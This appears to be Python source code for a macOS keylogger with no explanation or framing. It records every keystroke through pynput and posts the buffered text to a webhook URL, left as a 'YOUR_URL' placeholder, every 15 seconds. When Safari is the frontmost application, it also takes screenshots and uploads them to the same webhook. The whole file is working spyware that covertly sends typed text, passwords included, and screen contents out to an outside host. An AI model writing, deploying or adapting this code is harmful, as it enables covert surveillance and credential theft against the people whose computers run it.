import os
from pynput import keyboard
import requests
import threading
from datetime import datetime
import time
import subprocess
from PIL import ImageGrab

text = ""
WEBHOOK_URL = 'YOUR_URL' 
time_interval = 15

lock = threading.Lock()

def get_frontmost_app():
    script = 'tell application "System Events" to get name of first application process whose frontmost is true'
    result = subprocess.run(["osascript", "-e", script], capture_output=True, text=True)
    return result.stdout.strip()

def take_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/screenshot_{timestamp}.png"
    screenshot = ImageGrab.grab()
    screenshot.save(filename)
    return filename

def send_screenshot_if_safari():
    while True:
        time.sleep(time_interval)
        try:
            app = get_frontmost_app()
            if app.lower() == "safari":
                img_path = take_screenshot()
                with open(img_path, "rb") as f:
                    files = {"file": f}
                    requests.post(WEBHOOK_URL, files=files)
                os.remove(img_path)
        except Exception as e:
            print(f"[Screenshot Error] {e}")
  
def send():
    global text 
    while True:
       time.sleep(time_interval)
       with lock:
            if text:
                timestamp = datetime.now().strftime('%H:%M:%S')
                data = {"content": f"{timestamp} | {text}"}
                requests.post(WEBHOOK_URL, json=data)
                text = ''

def on_press(key):
    global text
    with lock: 
        if key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.caps_lock:
            pass
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            text += key.char
        else:
            text += f"[{str(key).split('.')[-1].upper()}]"
    
timer = threading.Thread(target=send, daemon=True)
timer.start()
threading.Thread(target=send_screenshot_if_safari, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
   listener.join()